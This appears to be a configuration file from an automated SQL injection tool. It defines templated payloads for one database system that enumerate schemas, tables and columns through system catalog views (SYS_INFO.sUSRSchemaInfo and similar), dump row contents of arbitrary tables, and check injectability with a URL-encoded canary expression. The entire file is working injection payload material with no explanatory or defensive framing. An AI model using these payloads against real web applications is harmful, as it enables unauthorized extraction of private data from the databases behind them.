schema.database: select rr || '${TRAIL_SQL} ' r from ( select '${ENCLOSE_VALUE_SQL}' || t.s || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}' rr from (select name s from SYS_INFO.sUSRSchemaInfo) t, (select name s from SYS_INFO.sUSRSchemaInfo) t1 where t.s >= t1.s group by t.s {limit} ) a
schema.table: select rr || '${TRAIL_SQL} ' r from ( select '${ENCLOSE_VALUE_SQL}' || t.s || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}' rr from (select name s from SYS_INFO.sUSRTableInfo where "schema" = '${DATABASE}') t, (select name s from SYS_INFO.sUSRTableInfo where "schema" = '${DATABASE}') t1 where t.s >= t1.s group by t.s {limit} ) a
schema.column: select rr || '${TRAIL_SQL} ' r from ( select '${ENCLOSE_VALUE_SQL}' || t.s || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}' rr from (select "column" s from SYS_INFO.sUSRTableColumns where "schema" = 'APP' and "table" = 'Order') t, (select "column" s from SYS_INFO.sUSRTableColumns where "schema" = 'APP' and "table" = 'Order') t1 where t.s >= t1.s group by t.s {limit} ) a

row.query: select rr || '${TRAIL_SQL} ' r from ( select '${ENCLOSE_VALUE_SQL}' || t.s || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}' rr from (select distinct ${FIELDS} s from "${DATABASE}"."${TABLE}") t, (select distinct ${FIELDS} s from "${DATABASE}"."${TABLE}") t1 where t.s >= t1.s group by t.s {limit} ) a

configuration.failsafe: select cast(x.rrr as char)rr from (select 1337${INDICE}7330%2b1 rrr)x
